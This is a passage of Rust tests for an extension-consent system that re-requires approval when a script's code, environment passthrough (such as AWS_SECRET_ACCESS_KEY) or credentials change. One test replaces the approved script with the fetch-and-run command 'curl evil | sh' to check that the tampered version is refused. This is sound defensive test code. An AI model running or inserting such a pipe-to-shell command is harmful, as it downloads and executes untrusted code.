    fn env_and_credentials_are_approved_but_lens_edits_are_not_code() {
        let ext = tempfile::tempdir().unwrap();
        script(ext.path(), "s.sh", "echo x");
        std::fs::write(ext.path().join("extension.yaml"), "name: x\n").unwrap();
        let mut s = spec("s.sh", &[]);
        let base = approval_hash(ext.path(), &s).unwrap();
        s.env = vec!["AWS_SECRET_ACCESS_KEY".into()];
        let with_env = approval_hash(ext.path(), &s).unwrap();
        assert_ne!(base, with_env, "a new env passthrough needs approving");
        s.credentials = vec!["TOKEN".into()];
        assert_ne!(with_env, approval_hash(ext.path(), &s).unwrap());
        let s = spec("s.sh", &[]);
        // Lens and manifest edits aren't code the source runs.
        std::fs::create_dir_all(ext.path().join("lenses")).unwrap();
        std::fs::write(ext.path().join("lenses/a.yaml"), "title: A").unwrap();
        std::fs::write(
            ext.path().join("extension.yaml"),
            "name: x\ndescription: y\n",
        )
        .unwrap();
        assert_eq!(base, approval_hash(ext.path(), &s).unwrap());
    }

    #[tokio::test]
    async fn run_approves_only_the_version_the_person_saw() {
        let root = tempfile::tempdir().unwrap();
        let state = root.path().join(".oxplow");
        let ext = root.path().join("oxplow/extensions/my-gh");
        std::fs::create_dir_all(&ext).unwrap();
        std::fs::write(
            ext.join("extension.yaml"),
            "name: my-gh\nsources:\n  - id: gh\n    runtime: exec\n    entry: sync.sh\n    entities:\n      - { name: pr, key: number, columns: { number: int } }\n",
        )
        .unwrap();
        script(
            &ext,
            "sync.sh",
            r#"echo '{"entities":{"pr":[{"number":1}]}}'"#,
        );
        let db = oxplow_db::Database::in_memory();
        let store = SqliteCollectorStore::new(db.clone());
        let secrets = oxplow_ai::secrets::MemorySecrets::default();
        let ctx = Collectors {
            root: root.path(),
            project: "test-project".into(),
            approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
            store: &store,
            secrets: &secrets,
            db: db.clone(),
            vocabulary: VocabularyHandle::core(),
            layer: crate::sql_gateway::SqlGateway::new(db.clone()),
            catalog: &crate::extension_catalog::ExtensionCatalog::new(),
            ai: no_ai(),
        };
        let seen = list_collectors(&ctx).await.unwrap()[0]
            .version
            .clone()
            .unwrap();
        script(&ext, "sync.sh", "curl evil | sh");
        let err = reviewed_run(&ctx, "my-gh", "gh", &seen).await.unwrap_err();
        assert!(
            matches!(err, RunCollectorError::NeedsApproval(ref m) if m.contains("changed")),
            "{err:?}"
        );
        assert!(!list_collectors(&ctx).await.unwrap()[0].approved);
    }
}
